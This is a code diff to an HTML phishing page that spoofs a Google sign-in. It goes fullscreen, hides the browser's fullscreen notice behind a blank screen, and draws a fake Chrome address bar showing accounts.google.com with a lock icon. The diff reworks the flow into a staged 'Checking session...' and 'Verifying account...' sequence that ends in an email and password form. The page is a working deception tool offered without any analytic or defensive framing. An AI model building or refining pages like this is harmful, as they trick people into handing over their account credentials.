@@ -1,9 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Continue</title>
-
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
 
 <style>
 html, body {
@@ -13,7 +12,7 @@ html, body {
     background:white;
 }
 
-/* overlay awal */
+/* START SCREEN */
 #start {
     position:fixed;
     width:100%;
@@ -26,7 +25,7 @@ html, body {
     z-index:10000;
 }
 
-/* layar kosong saat fullscreen */
+/* BLANK SCREEN */
 #blank {
     position:fixed;
     width:100%;
@@ -36,19 +35,18 @@ html, body {
     display:none;
 }
 
-/* fake address bar */
+/* FAKE CHROME BAR */
 #fakebar {
     position:fixed;
     top:0;
     left:0;
     width:100%;
-    height:50px;
+    height:56px;
     background:#f1f3f4;
-    border-bottom:1px solid #ccc;
     display:flex;
     align-items:center;
     padding:0 10px;
-    font-size:14px;
+    box-shadow:0 1px 2px rgba(0,0,0,0.2);
     z-index:9999;
     opacity:0;
     transition:0.3s;
@@ -58,22 +56,24 @@ html, body {
     opacity:1;
 }
 
+/* URL FIELD */
 .url {
     background:white;
-    padding:6px 12px;
     border-radius:20px;
+    padding:6px 12px;
     border:1px solid #ccc;
-    margin-left:10px;
     flex:1;
+    font-size:14px;
+    color:#444;
 }
 
-/* konten */
+/* CONTENT */
 #content {
     display:none;
-    padding:100px 20px 20px;
+    padding-top:100px;
     text-align:center;
     opacity:0;
-    transition:0.3s;
+    transition:0.4s;
 }
 
 input {
@@ -81,31 +81,24 @@ input {
     width:80%;
     padding:12px;
     font-size:16px;
-    border-radius:20px;
+    border-radius:25px;
     border:1px solid #ccc;
 }
 </style>
-
 </head>
 
 <body>
 
-<div id="start">
-    Tap to Continue
-</div>
-
+<div id="start">Tap to Continue</div>
 <div id="blank"></div>
 
 <div id="fakebar">
-    🔒 <div class="url">https://accounts.google.com</div>
+    🔒 <div class="url">accounts.google.com</div>
 </div>
 
 <div id="content">
-    <h2>Google Session Expired</h2>
-    <p>Please login again</p>
-    <input type="text" placeholder="Email">
-    <br>
-    <input type="password" placeholder="Password">
+    <h2>Checking session...</h2>
+    <p id="status">Please wait</p>
 </div>
 
 <script>
@@ -113,29 +106,45 @@ let start = document.getElementById("start");
 let blank = document.getElementById("blank");
 let fakebar = document.getElementById("fakebar");
 let content = document.getElementById("content");
+let status = document.getElementById("status");
 
 start.addEventListener("click", async () => {
     try {
-        // masuk fullscreen
         await document.documentElement.requestFullscreen();
 
-        // sembunyikan overlay awal
         start.style.display = "none";
 
-        // tampilkan layar kosong sementara (distraction)
+        // blank distraction
         blank.style.display = "block";
 
-        // delay 0.7 detik biar popup fullscreen muncul & hilang
         setTimeout(() => {
+
             blank.style.display = "none";
 
-            // tampilkan UI spoof
+            // tampilkan fake bar
             fakebar.classList.add("show");
+
+            // tampilkan konten
             content.style.display = "block";
+
             setTimeout(() => {
                 content.style.opacity = 1;
             }, 50);
-        }, 700);
+
+            // fake loading flow
+            setTimeout(() => {
+                status.innerText = "Verifying account...";
+            }, 1000);
+
+            setTimeout(() => {
+                content.innerHTML = `
+                    <h2>Sign in</h2>
+                    <input placeholder="Email"><br>
+                    <input type="password" placeholder="Password">
+                `;
+            }, 2200);
+
+        }, 1200); // timing penting
 
     } catch (e) {
         alert("Fullscreen blocked");
